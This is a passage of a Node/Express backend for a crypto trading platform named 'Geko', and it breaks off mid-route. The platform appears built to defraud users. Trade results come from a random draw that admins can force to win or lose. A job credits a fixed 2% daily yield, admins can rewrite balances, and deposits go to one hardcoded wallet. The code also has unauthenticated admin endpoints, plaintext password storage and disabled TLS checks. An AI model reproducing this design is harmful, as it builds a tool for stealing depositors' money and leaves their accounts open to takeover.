import express from 'express';
import cors from 'cors';
import pg from 'pg';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Keypair, Transaction, SystemProgram } from '@solana/web3.js';
import { sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Global Error Handlers to prevent crashes
process.on('uncaughtException', (err) => {
  console.error('[CRITICAL] Uncaught Exception:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRITICAL] Unhandled Rejection at:', promise, 'reason:', reason);
});

const app = express();
// USE PORT 8080 FOR UNIFIED PREVIEW
const port = 8080;

// ─── Debug Logger ──────────────────────────────────────────────────────────
app.use((req, res, next) => {
  console.log(`[Request] ${req.method} ${req.url}`);
  next();
});

app.use(cors());
// Allow framing and basic security headers
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'ALLOWALL');
  
  // Force correct MIME types for TypeScript and JSX files to fix "blank screen" issues
  const url = req.url.toLowerCase();
  if (url.endsWith('.ts') || url.endsWith('.tsx') || url.endsWith('.jsx')) {
    res.setHeader('Content-Type', 'application/javascript');
  }
  next();
});

app.use(express.json());

let globalConfig = {
  vault_balance: "0.00",
  deposit_address: "6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw"
};
const { Pool } = pg;
let pool = null;
let dbAvailable = false;
let lastInitError = null;
let dbInitPromise = null;

const initializeDatabase = async () => {
  if (!process.env.DATABASE_URL) return;
  try {
    console.log('[DB] Connecting to database...');
    const client = await pool.connect();
    console.log('[DB] Connection successful');
    client.release();

    // Step 1: Core Tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_users (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT UNIQUE,
        nickname TEXT DEFAULT '',
        email TEXT UNIQUE,
        password TEXT,
        invitation_code TEXT,
        status TEXT DEFAULT 'guest',
        wallet_data JSONB DEFAULT '{}',
        trading_balance DECIMAL(24, 8) DEFAULT 0,
        demo_balance DECIMAL(24, 8) DEFAULT 100000,
        available_balance DECIMAL(24, 8) DEFAULT 0,
        available_demo_balance DECIMAL(24, 8) DEFAULT 100000,
        protocol_settlement_balance DECIMAL(24, 8) DEFAULT 0,
        pending_deposit_currency TEXT DEFAULT 'BTC',
        pending_deposit_amount DECIMAL(24, 8) DEFAULT 0,
        last_seen TIMESTAMPTZ DEFAULT NOW(),
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_config (
        key TEXT PRIMARY KEY,
        value TEXT,
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    // Step 2: Columns one by one for maximum safety
    const addColumn = async (name, type, def) => {
      try {
        await pool.query(`ALTER TABLE geko_users ADD COLUMN IF NOT EXISTS ${name} ${type} DEFAULT ${def}`);
      } catch (e) {
        console.warn(`[DB] Column ${name} may already exist or error:`, e.message);
      }
    };

    await addColumn('nickname', 'TEXT', "''");
    await addColumn('kyc_status', 'TEXT', "'none'");
    await addColumn('force_win', 'BOOLEAN', 'FALSE');
    await addColumn('last_interest_at', 'TIMESTAMPTZ', 'NOW()');
    await addColumn('ip_address', 'TEXT', "''");
    await addColumn('available_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('available_demo_balance', 'DECIMAL(24, 8)', '100000');
    await addColumn('balance_override', 'TEXT', "''");
    await addColumn('referral_code', 'TEXT', "''");
    await addColumn('referred_by', 'TEXT', "''");
    await addColumn('protocol_settlement_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('trading_balance', 'DECIMAL(24, 8)', '0');
    await addColumn('demo_balance', 'DECIMAL(24, 8)', '100000');
    await addColumn('email', 'TEXT', "NULL");
    await addColumn('password', 'TEXT', "NULL");
    await addColumn('invitation_code', 'TEXT', "NULL");
    await addColumn('status', 'TEXT', "'guest'");
    await addColumn('pending_deposit_currency', 'TEXT', "'BTC'");
    await addColumn('pending_deposit_amount', 'DECIMAL(24, 8)', '0');

    // Step 3: Constraints & Cleanup
    await pool.query(`
      DO $$ 
      BEGIN 
        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_wallet_address_key') THEN
          BEGIN
            DELETE FROM geko_users a USING geko_users b
            WHERE a.id < b.id AND a.wallet_address = b.wallet_address;
            ALTER TABLE geko_users ADD CONSTRAINT geko_users_wallet_address_key UNIQUE (wallet_address);
          EXCEPTION WHEN OTHERS THEN
            RAISE NOTICE 'Could not add unique constraint on wallet_address';
          END;
        END IF;
        IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'geko_users_email_key') THEN
          BEGIN
            ALTER TABLE geko_users ADD CONSTRAINT geko_users_email_key UNIQUE (email);
          EXCEPTION WHEN OTHERS THEN
            RAISE NOTICE 'Could not add unique constraint on email';
          END;
        END IF;
      END $$;
    `);

    // Step 4: Defaults & Defaults Config
    try {
      await pool.query(`
        UPDATE geko_users SET trading_balance = COALESCE(trading_balance, 0) WHERE trading_balance IS NULL;
        UPDATE geko_users SET demo_balance = COALESCE(demo_balance, 100000) WHERE demo_balance IS NULL;
        UPDATE geko_users SET protocol_settlement_balance = COALESCE(protocol_settlement_balance, 0) WHERE protocol_settlement_balance IS NULL;
      `);
    } catch (e) {
      console.warn('[DB] Non-critical default update failed:', e.message);
    }

    await pool.query(`
      INSERT INTO geko_config (key, value)
      VALUES ('solana_deposit_address', '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw')
      ON CONFLICT (key) DO NOTHING
    `);

    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_wallet ON geko_users (wallet_address)`);
    await pool.query(`CREATE INDEX IF NOT EXISTS idx_users_last_seen ON geko_users (last_seen)`);

    // Step 5: Secondary Tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS trades (
        id TEXT PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        symbol TEXT NOT NULL,
        direction TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        entry_price DECIMAL(24, 8) NOT NULL,
        duration INTEGER NOT NULL,
        status TEXT DEFAULT 'pending',
        force_outcome TEXT,
        is_demo BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        settled_at TIMESTAMPTZ
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS withdrawal_requests (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        destination_address TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        asset TEXT NOT NULL DEFAULT 'SOL',
        status TEXT NOT NULL DEFAULT 'pending',
        tx_signature TEXT,
        admin_note TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW(),
        processed_at TIMESTAMPTZ
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS transactions (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        asset_symbol TEXT NOT NULL,
        amount DECIMAL(24, 8) NOT NULL,
        type TEXT NOT NULL,
        status TEXT NOT NULL DEFAULT 'completed',
        payment_id TEXT,
        tx_signature TEXT,
        reference TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS geko_visitors (
        id SERIAL PRIMARY KEY,
        visitor_id TEXT,
        ip_address TEXT,
        user_agent TEXT,
        language TEXT,
        timezone TEXT,
        screen_size TEXT,
        platform TEXT,
        referrer TEXT,
        page_path TEXT,
        wallet_extensions JSONB DEFAULT '[]',
        visit_count INTEGER DEFAULT 1,
        first_seen TIMESTAMPTZ DEFAULT NOW(),
        last_seen TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS support_tickets (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        subject TEXT NOT NULL,
        messages JSONB DEFAULT '[]',
        status TEXT DEFAULT 'open',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS kyc_submissions (
        id SERIAL PRIMARY KEY,
        wallet_address TEXT NOT NULL,
        full_name TEXT,
        date_of_birth TEXT,
        country TEXT,
        id_type TEXT,
        id_number TEXT,
        status TEXT DEFAULT 'pending',
        admin_note TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);

    dbAvailable = true;
    console.log('[DB] Database fully initialized and ready.');
    
    // Server-side trade settlement loop
    setInterval(async () => {
      if (!dbAvailable || !pool) return;
      try {
        const res = await pool.query(
          "SELECT * FROM trades WHERE status = 'pending' AND created_at <= NOW() - (duration || ' seconds')::interval"
        );
        for (const trade of res.rows) {
          console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
          let isWin = false;
          if (trade.force_outcome === 'win') isWin = true;
          else if (trade.force_outcome === 'loss') isWin = false;
          else isWin = Math.random() > 0.45;

          const payout = isWin ? parseFloat(trade.amount) * 1.85 : 0;
          const balanceField = trade.is_demo ? 'demo_balance' : 'trading_balance';

          await pool.query(
            "UPDATE trades SET status = $1, settled_at = NOW() WHERE id = $2",
            [isWin ? 'won' : 'lost', trade.id]
          );

          if (payout > 0) {
            await pool.query(
              `UPDATE geko_users SET ${balanceField} = ${balanceField} + $1 WHERE wallet_address = $2`,
              [payout, trade.wallet_address]
            );
            await recordTransaction({
              wallet_address: trade.wallet_address,
              asset_symbol: 'USDT',
              amount: payout,
              type: 'trade',
              reference: `trade-auto-settle:${trade.id}`
            });
          }
        }
      } catch (e) {
        console.error('[Auto-Settle Error]', e.message);
      }
    }, 5000);

    setInterval(processDailyInterest, 60 * 60 * 1000); 
    processDailyInterest();
  } catch (err) {
    console.error('[DB Error] CRITICAL initialization failure:', err.message);
    console.error(err.stack);
    lastInitError = err.message;
    dbAvailable = false;
  }
};

if (process.env.DATABASE_URL) {
  const maskedUrl = process.env.DATABASE_URL.replace(/:([^:@]+)@/, ':****@');
  console.log(`[DB] Using DATABASE_URL: ${maskedUrl}`);

  pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
  });

  dbInitPromise = initializeDatabase();
} else { 
  console.warn('DATABASE_URL is not set in .env. Database features will be unavailable.');
}

// ─── Health check ──────────────────────────────────────────────────────────
app.get('/api/health', async (req, res) => {
  if (dbInitPromise) await dbInitPromise.catch(() => {});
  
  let dbStatus = dbAvailable ? 'CONNECTED ✅' : 'DISCONNECTED ❌';
  let userCount = 0;
  let lastError = null;
  
  if (dbAvailable && pool) {
    try {
      const r = await pool.query('SELECT COUNT(*) FROM geko_users');
      userCount = parseInt(r.rows[0].count);
    } catch (e) {
      dbStatus = 'QUERY_ERROR ⚠️';
      lastError = e.message;
    }
  } else if (process.env.DATABASE_URL) {
    dbStatus = 'INITIALIZING 🔄';
  } else {
    dbStatus = 'NO_DATABASE_URL ⚠️';
  }
  
  res.json({ 
    status: 'ONLINE', 
    db: dbStatus, 
    users: userCount, 
    error: lastError || lastInitError,
    time: new Date().toISOString() 
  });
});

// ─── Global Database Wait Middleware ──────────────────────────────────────
app.use(async (req, res, next) => {
  if (dbInitPromise && req.url.startsWith('/api')) {
    try {
      // Wait for initialization but don't block forever (max 15s for Vercel)
      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 15000));
      await Promise.race([dbInitPromise, timeout]).catch(err => {
        console.warn('[DB Middleware] Initialization check timed out or failed:', err.message);
      });
    } catch (e) {
      console.error('[DB Middleware] Error awaiting initialization:', e.message);
    }
  }
  next();
});

// ─── Shared Utilities ──────────────────────────────────────────────────────
async function recordTransaction({ wallet_address, asset_symbol, amount, type, payment_id = null, tx_signature = null, reference = null, status = 'completed' }) {
  if (!dbAvailable || !pool || !wallet_address) return null;

  // AGGRESSIVE NODE SYNC: Always ensure user exists in cloud registry
  try {
    await pool.query(
      `INSERT INTO geko_users (wallet_address, last_seen) VALUES ($1, NOW()) 
       ON CONFLICT (wallet_address) DO UPDATE SET last_seen = NOW()`,
      [wallet_address]
    );
  } catch (upsertErr) {
    console.error('[Record Tx] NODE_SYNC_ERROR:', upsertErr.message);
  }
  
  const res = await pool.query(
    `INSERT INTO transactions (wallet_address, asset_symbol, amount, type, payment_id, tx_signature, reference, status)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *`,
    [wallet_address, asset_symbol.toUpperCase(), amount, type, payment_id, tx_signature, reference, status]
  );

  return res.rows[0];
}

async function getUserBalance(walletAddress, assetSymbol) {
  if (!dbAvailable || !pool) return 0;

  // For USDT, we use the protocol_settlement_balance column primarily
  if (assetSymbol.toUpperCase() === 'USDT') {
    try {
      const userRes = await pool.query(
        'SELECT protocol_settlement_balance FROM geko_users WHERE wallet_address = $1',
        [walletAddress]
      );
      if (userRes.rows.length) return parseFloat(userRes.rows[0].protocol_settlement_balance || 0);
    } catch (e) {
      console.error('[Balance] Column fetch error:', e.message);
    }
  }

  const res = await pool.query(
    `SELECT COALESCE(SUM(amount), 0) AS balance
       FROM transactions
      WHERE wallet_address = $1 AND asset_symbol = $2 AND status = 'completed' AND type != 'trade'`,
    [walletAddress, assetSymbol.toUpperCase()]
  );
  return parseFloat(res.rows[0].balance || 0);
}


// ─── Daily 2% Interest Processor ──────────────────────────────────────────
async function processDailyInterest() {
  if (!dbAvailable || !pool) return;
  try {
    console.log('[Interest] Checking for eligible users for 2% daily increase...');
    // Find users who haven't received interest in last 24 hours
    const res = await pool.query(
      `SELECT wallet_address, last_interest_at 
       FROM geko_users 
       WHERE last_interest_at <= NOW() - INTERVAL '24 hours'`
    );

    for (const user of res.rows) {
      const vaultBal = await getUserBalance(user.wallet_address, 'USDT');
      if (vaultBal > 0) {
        const interestAmt = vaultBal * 0.02;
        await recordTransaction({
          wallet_address: user.wallet_address,
          asset_symbol:   'USDT',
          amount:         interestAmt,
          type:           'interest',
          reference:      '2%_daily_vault_increase'
        });
        await pool.query(
          'UPDATE geko_users SET last_interest_at = NOW() WHERE wallet_address = $1',
          [user.wallet_address]
        );
        console.log(`[Interest] Credited ${interestAmt.toFixed(4)} USDT to ${user.wallet_address}`);
      } else {
        await pool.query(
          'UPDATE geko_users SET last_interest_at = NOW() WHERE wallet_address = $1',
          [user.wallet_address]
        );
      }
    }
  } catch (err) {
    console.error('[Interest Error] Failed to process daily interest:', err.message);
  }
}

// ─── PWA Manifest ───────────────────────────────────────────────────────────
app.get('/manifest.json', (req, res) => {
  res.json({
    "short_name": "Geko",
    "name": "Geko Institutional Terminal",
    "start_url": ".",
    "display": "standalone",
    "theme_color": "#0B0E11",
    "background_color": "#0B0E11"
  });
});

// ─── Config endpoints ──────────────────────────────────────────────────────
app.get('/api/config', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const result = await pool.query('SELECT key, value FROM geko_config');
      const dbConfig = result.rows.reduce((acc, row) => ({ ...acc, [row.key]: row.value }), {});
      return res.json({ ...globalConfig, ...dbConfig });
    } catch (e) { console.error('Config fetch error:', e.message); }
  }
  res.json({ ...globalConfig, solana_deposit_address: '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw' });
});

app.post('/api/admin/config', async (req, res) => {
  const { solana_deposit_address } = req.body;

  if (dbAvailable && pool) {
    try {
      if (solana_deposit_address) {
        await pool.query(
          `INSERT INTO geko_config (key, value, updated_at)
           VALUES ('solana_deposit_address', $1, NOW())
           ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()`,
          [solana_deposit_address]
        );
      }
      return res.json({ success: true });
    } catch (e) {
      console.error('Config update error:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  
  if (solana_deposit_address !== undefined) globalConfig.solana_deposit_address = solana_deposit_address;
  res.json({ success: true, config: globalConfig });
});

// ─── Live prices proxy ─────────────────────────────────────────────────────
app.get('/api/binance/prices', async (req, res) => {
  try {
    const krakenPairs = 'XXBTZUSD,XETHZUSD,SOLUSD,XXRPZUSD,ADAUSD,AVAXUSD,XDGUSD,DOTUSD,LINKUSD,XLTCZUSD,TRXUSD,UNIUSD,ATOMUSD,AAVEUSD';
    const krakenRes = await axios.get(`https://api.kraken.com/0/public/Ticker?pair=${krakenPairs}`, {
      headers: { 'Accept': 'application/json', 'User-Agent': 'GekoProtocol/1.0' }
    });
    const r = krakenRes.data.result;

    const findPair = (candidates) => {
      for (const c of candidates) { if (r[c]) return r[c]; }
      return null;
    };
    const change = (pair) => {
      if (!pair) return '0';
      const last = parseFloat(pair.c[0]);
      const open = parseFloat(pair.o);
      return open > 0 ? (((last - open) / open) * 100).toFixed(2) : '0';
    };

    const pairs = {
      BTC:  findPair(['XXBTZUSD', 'XBTUSD', 'BTCUSD']),
      ETH:  findPair(['XETHZUSD', 'ETHUSD']),
      SOL:  findPair(['SOLUSD']),
      XRP:  findPair(['XXRPZUSD', 'XRPUSD']),
      ADA:  findPair(['ADAUSD']),
      AVAX: findPair(['AVAXUSD']),
      DOGE: findPair(['XDGUSD', 'DOGEUSD']),
      DOT:  findPair(['DOTUSD']),
      LINK: findPair(['LINKUSD']),
      LTC:  findPair(['XLTCZUSD', 'LTCUSD']),
      TRX:  findPair(['TRXUSD']),
      UNI:  findPair(['UNIUSD']),
      ATOM: findPair(['ATOMUSD']),
      AAVE: findPair(['AAVEUSD']),
      BNB:  findPair(['BNBUSD']),
    };

    const mapped = Object.entries(pairs)
      .filter(([, p]) => p)
      .map(([sym, p]) => ({ symbol: `${sym}USDT`, lastPrice: p.c[0], priceChangePercent: change(p) }));

    return res.json(mapped);
  } catch (err) {
    console.warn('Kraken failed:', err.message);
    return res.status(500).json({ error: 'Price data unavailable' });
  }
});

// ─── Admin User Management ─────────────────────────────────────────────────
app.get('/api/admin/users', async (req, res) => {
  if (dbAvailable && pool) {
    try {
      const result = await pool.query(`
        SELECT u.*, 
               (SELECT COUNT(*) FROM trades t WHERE t.wallet_address = u.wallet_address AND t.status = 'pending') as active_trades_count
        FROM geko_users u 
        WHERE u.wallet_address IS NOT NULL AND u.wallet_address != ''
        ORDER BY last_seen DESC
      `);
      return res.json(result.rows);
    } catch (e) {
      console.error('[Admin] REGISTRY_FETCH_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(400).json({ error: 'Database unavailable' });
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data, balance_override, trading_balance, demo_balance, protocol_settlement_balance } = req.body;

  if (dbAvailable && pool) {
    try {
      const updates = [];
      const values = [];
      let idx = 1;
      if (wallet_data !== undefined) { updates.push(`wallet_data = $${idx++}`); values.push(JSON.stringify(wallet_data)); }
      if (balance_override !== undefined) { updates.push(`balance_override = $${idx++}`); values.push(balance_override); }
      if (trading_balance !== undefined) { updates.push(`trading_balance = $${idx++}`); values.push(trading_balance); }
      if (demo_balance !== undefined) { updates.push(`demo_balance = $${idx++}`); values.push(demo_balance); }
      if (protocol_settlement_balance !== undefined) { updates.push(`protocol_settlement_balance = $${idx++}`); values.push(protocol_settlement_balance); }
      values.push(id);
      if (updates.length > 0) {
        await pool.query(`UPDATE geko_users SET ${updates.join(', ')} WHERE id = $${idx}`, values);
      }
      const result = await pool.query('SELECT * FROM geko_users WHERE id = $1', [id]);
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('[Admin] USER_UPDATE_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }

  res.status(400).json({ error: 'Database unavailable' });
});

// Register / upsert a user (called on wallet connect)
app.post('/api/users/upsert', async (req, res) => {
  let { wallet_address, address, wallet_data, ip_address, nickname } = req.body;
  const targetAddress = (wallet_address || address || '').trim();
  
  if (!targetAddress || targetAddress.length < 32) {
    return res.status(400).json({ error: 'Valid wallet_address required' });
  }

  if (dbAvailable && pool) {
    try {
      const upsertQuery = `
        INSERT INTO geko_users (wallet_address, wallet_data, ip_address, last_seen, nickname, demo_balance)
        VALUES ($1, $2, $3, NOW(), $4, 100000)
        ON CONFLICT (wallet_address) DO UPDATE
        SET wallet_data = EXCLUDED.wallet_data,
            ip_address = EXCLUDED.ip_address,
            last_seen = NOW(),
            nickname = COALESCE(NULLIF($4, ''), geko_users.nickname)
        RETURNING *`;
      
      const values = [
        targetAddress, 
        JSON.stringify(wallet_data || {}), 
        ip_address || req.ip || null,
        nickname || null
      ];
      
      const result = await pool.query(upsertQuery, values);
      return res.json({ success: true, user: result.rows[0] });
    } catch (e) {
      console.error('[Upsert] CRITICAL_SYNC_FAILURE:', e.message);
      return res.status(500).json({ error: `Sync Error: ${e.message}` });
    }
  }

  res.status(503).json({ error: 'Cloud Registry Unavailable' });
});

// Heartbeat
app.post('/api/users/heartbeat', async (req, res) => {
  const { wallet_address, address } = req.body || {};
  const target = (wallet_address || address || '').trim();
  if (!target) return res.json({ success: false });

  if (dbAvailable && pool) {
    try {
      await pool.query(
        `UPDATE geko_users SET last_seen = NOW() WHERE wallet_address = $1`,
        [target]
      );
      return res.json({ success: true });
    } catch (e) { 
      console.error('Heartbeat error:', e.message);
      return res.status(500).json({ success: false, error: 'Internal server error' });
    }
  }
  res.status(503).json({ success: false, error: 'Database unavailable' });
});

app.get('/api/user/data', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const result = await pool.query('SELECT * FROM geko_users WHERE wallet_address = $1 LIMIT 1', [address || null]);
    if (result.rows.length > 0) {
      return res.json(result.rows[0]);
    } else {
      return res.status(404).json({ error: 'User not found' });
    }
  } catch (e) { 
    console.error('User fetch error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── Email Auth: Login & Signup ──────────────────────────────────────────────
app.post('/api/auth/signup', async (req, res) => {
  const { email, password, invitationCode } = req.body;
  if (!email || !password || !invitationCode) return res.status(400).json({ error: 'All fields required' });
  if (invitationCode !== '196405') return res.status(400).json({ error: 'Invalid invitation code' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    const nickname = userEmail.split('@')[0].toUpperCase();
    const virtualAddress = '0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40);

    const result = await pool.query(
      `INSERT INTO geko_users (email, password, invitation_code, nickname, wallet_address, status, last_seen) 
       VALUES ($1, $2, $3, $4, $5, 'guest', NOW())
       RETURNING *`,
      [userEmail, password, invitationCode, nickname, virtualAddress]
    );
    res.json({ success: true, user: result.rows[0] });
  } catch (e) {
    if (e.message.includes('unique constraint')) return res.status(400).json({ error: 'Email already registered' });
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    const result = await pool.query(
      `SELECT * FROM geko_users WHERE email = $1 AND password = $2`,
      [userEmail, password]
    );
    
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });
    
    const user = result.rows[0];
    if (user.status === 'guest') return res.status(403).json({ error: 'Account pending admin approval', status: 'guest' });
    if (user.status === 'rejected') return res.status(403).json({ error: 'Account rejected by admin', status: 'rejected' });

    await pool.query('UPDATE geko_users SET last_seen = NOW() WHERE id = $1', [user.id]);

    return res.json({ 
      success: true, 
      user: {
        id: user.id,
        address: user.wallet_address,
        email: user.email,
        nickname: user.nickname,
        status: user.status,
        wallet_data: user.wallet_data || {},
        trading_balance: user.trading_balance,
        demo_balance: user.demo_balance,
        protocol_settlement_balance: user.protocol_settlement_balance,
        pending_deposit_currency: user.pending_deposit_currency,
        pending_deposit_amount: user.pending_deposit_amount
      }
    });
  } catch (e) {
    console.error('Email login error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Admin Management Endpoints ───────────────────────────────────────────
app.post('/api/admin/users/approve', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    await pool.query("UPDATE geko_users SET status = 'approved' WHERE id = $1", [userId]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/users/reject', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    await pool.query("UPDATE geko_users SET status = 'rejected' WHERE id = $1", [userId]);
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/deposit', async (req, res) => {
  const { walletAddress, currency, amount } = req.body;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    await pool.query(
      "UPDATE geko_users SET pending_deposit_currency = $1, pending_deposit_amount = $2 WHERE wallet_address = $3",
      [currency.toUpperCase(), amount, walletAddress]
    );
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/user/swap', async (req, res) => {
  const { walletAddress } = req.body;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const userRes = await pool.query(
      "SELECT pending_deposit_amount FROM geko_users WHERE wallet_address = $1",
      [walletAddress]
    );
    if (userRes.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    const amount = parseFloat(userRes.rows[0].pending_deposit_amount || 0);
    if (amount <= 0) return res.status(400).json({ error: 'No pending deposit to swap' });

    await pool.query(
      "UPDATE geko_users SET protocol_settlement_balance = protocol_settlement_balance + $1, pending_deposit_amount = 0, pending_deposit_currency = NULL WHERE wallet_address = $2",
      [amount, walletAddress]
    );

    await recordTransaction({
      wallet_address: walletAddress,
      asset_symbol: 'USDT',
      amount: amount,
      type: 'swap',
      reference: 'manual_admin_deposit_swap'
    });

    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Support Chat Endpoints ─────────────────────────────────────────────
app.get('/api/support/messages', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const result = await pool.query(
      "SELECT messages FROM support_tickets WHERE wallet_address = $1 LIMIT 1",
      [address]
    );
    res.json(result.rows[0]?.messages || []);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/support/send', async (req, res) => {
  const { address, message, sender } = req.body;
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const ticketRes = await pool.query(
      "SELECT id, messages FROM support_tickets WHERE wallet_address = $1 LIMIT 1",
      [address]
    );
    const newMessage = { text: message, sender, timestamp: new Date().toISOString() };
    if (ticketRes.rows.length === 0) {
      await pool.query(
        "INSERT INTO support_tickets (wallet_address, subject, messages) VALUES ($1, 'General Support', $2)",
        [address, JSON.stringify([newMessage])]
      );
    } else {
      const messages = ticketRes.rows[0].messages || [];
      messages.push(newMessage);
      await pool.query(
        "UPDATE support_tickets SET messages = $1, updated_at = NOW() WHERE id = $2",
        [JSON.stringify(messages), ticketRes.rows[0].id]
      );
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/support/tickets', async (req, res) => {
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const result = await pool.query("SELECT * FROM support_tickets ORDER BY updated_at DESC");
    res.json(result.rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Balance Transfer ─────────────────────────────────────────────────────
app.post('/api/balance/transfer', async (req, res) => {
  const { walletAddress, amount, direction } = req.body;
  if (!walletAddress || !amount || !direction) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const amt = Math.abs(parseFloat(amount));
    const userRes = await pool.query('SELECT protocol_settlement_balance, trading_balance FROM geko_users WHERE wallet_address = $1', [walletAddress]);
    if (userRes.rows.length === 0) return res.status(404).json({ error: 'User not found' });
    
    const vaultBal = parseFloat(userRes.rows[0].protocol_settlement_balance || 0);
    const tradeBal = parseFloat(userRes.rows[0].trading_balance || 0);

    if (direction === 'vault_to_trade') {
      if (vaultBal < amt) return res.status(400).json({ error: 'Insufficient protocol settlement balance' });
      await pool.query('UPDATE geko_users SET protocol_settlement_balance = protocol_settlement_balance - $1, trading_balance = trading_balance + $1 WHERE wallet_address = $2', [amt, walletAddress]);
    } else if (direction === 'trade_to_vault') {
      if (tradeBal < amt) return res.status(400).json({ error: 'Insufficient trading balance' });
      await pool.query('UPDATE geko_users SET trading_balance = trading_balance - $1, protocol_settlement_balance = protocol_settlement_balance + $1 WHERE wallet_address = $2', [amt, walletAddress]);
    } else {
      return res.status(400).json({ error: 'Invalid direction' });
    }

    const newUserRes = await pool.query('SELECT * FROM geko_users WHERE wallet_address = $1', [walletAddress]);
    res.json({ success: true, trading_balance: newUserRes.rows[0].trading_balance, protocol_settlement_balance: newUserRes.rows[0].protocol_settlement_balance });
  } catch (e) {
    console.error('Transfer error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Visitor tracking ──────────────────────────────────────────────────────
app.post('/api/visitors/track', async (req, res) => {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '').trim();
  const { visitor_id, user_agent, page_path } = req.body || {};

  if (!dbAvailable || !pool) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const existing = await pool.query('SELECT id FROM geko_visitors WHERE visitor_id = $1 LIMIT 1', [visitor_id]);
    if (existing.rows.length) {
